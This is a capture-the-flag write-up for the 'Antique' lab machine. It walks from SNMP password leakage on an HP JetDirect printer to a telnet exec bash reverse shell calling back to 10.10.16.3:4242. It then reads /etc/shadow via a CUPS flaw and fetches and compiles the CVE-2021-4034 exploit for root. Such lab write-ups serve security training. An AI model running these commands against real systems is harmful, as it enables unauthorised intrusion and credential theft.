# Antique Writeup

Target host: 10.10.11.107
Tcp portscan
```go
Open 10.10.11.107:23
```

Udp portscan
```go
└──╼ $sudo nmap 10.10.11.107 -sU -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 19:08 AEST
Nmap scan report for 10.10.11.107
Host is up (0.41s latency).

PORT     STATE  SERVICE      VERSION
161/udp  open   snmp         SNMPv1 server (public)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
```

Attempting to log into the telnet server on the target.
```go
└──╼ $telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: 
Invalid password
Connection closed by foreign host.
```

Attempted with mutliple users and credentials, but all ended in failure. 

Though logging into the telnet server was unsuccessful, the server did provide us some information about the brand and model of the device. This information will help us search for any available exploits that can be used to break into the server.

A google search on HP JetDirect printer exploits reveals an [article](http://www.irongeek.com/i.php?page=security/networkprinterhacking) which uses a tool named `snmpget`, to call on certain variables names to leak the password used for snmp server.

By using another tool called snmpwalk, we can take the same arguments and variable names to effectivly execute the same exploit.

The following is command required to exploit the snmp server.
```go
snmpwalk -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

The following is the result received from the above command
`50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135`

By the using the following script we can convert the hex above to ascii.
```python
text = "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135".split(" ")

output = ""
for i in text:
    output += chr(int(i, 16))

print(f"Output: {output}")
```

The script above produces the following result.
`P@ssw0rd@123!!123\x01\x03\t\x17\x18\x19"#%&\'01345789BCIPQTWXaetuy\x82\x83\x86\x90\x91\x94\x95\x98ăĆđĔĕęĢģĦİıĴĵ`

As seen above, the password can be seen in the first 17 in the string `P@ssw0rd@123!!123`.

Using the password above, the we were was able to successfully log into the telnet server.
```go
└──╼ $telnet 10.10.11.107 -l root
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?  

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```

Similar to ssh, telnet gives the user access to the operating system through the `exec` command. As seen below, this was exploited to get a bash reverse shell.
```go
> exec echo "/bin/bash -i >& /dev/tcp/10.10.16.3/4242 0>&1" > shell.sh
> exec chmod +x shell.sh
> exec /bin/bash shell.sh
```

```go
└──╼ $nc -nvlp 4242
listening on [any] 4242 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.107] 44806
bash: cannot set terminal process group (1015): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$ ls
ls
shell.sh
telnet.py
user.txt
lp@antique:~$ whoami
whoami
lp
```

Entering the id command shows that the user is part of the lpadmin group, which is specifically used for managining CUPS (common unix printer system).

```go
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```

Performing a quick google search shows that the machine is  vulnerable to an exploit that allows an under privileged user to read files as root.
https://github.com/p1ckzi/CVE-2012-5519

Below is some output after I attempt to read /etc/shadow.
```go
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18891:0:99999:7:::
```

This is good, however breaking the hash for root is going to too long.

From this point on, I executed linpeas and discovered that the machine is also vulnerable to CVE-2021-4034

After compiling the C source code found [here](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c), I successfully able to evelvate my current shell to a root shell.
```go
lp@antique:/home/lp$ curl http://10.10.16.3:9001/cve-2021-4034-poc.c -o test.c
<ttp://10.10.16.3:9001/cve-2021-4034-poc.c -o test.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1267  100  1267    0     0   1214      0  0:00:01  0:00:01 --:--:--  1214
lp@antique:/home/lp$ ls
ls
linpeas.sh
test.c
user.txt
lp@antique:/home/lp$ gcc test.c -o test
gcc test.c -o test
lp@antique:/home/lp$ chmod +x test
chmod +x test
lp@antique:/home/lp$ ./test 
./test
whaomi
/bin/sh: 1: whaomi: not found
whoami
root
```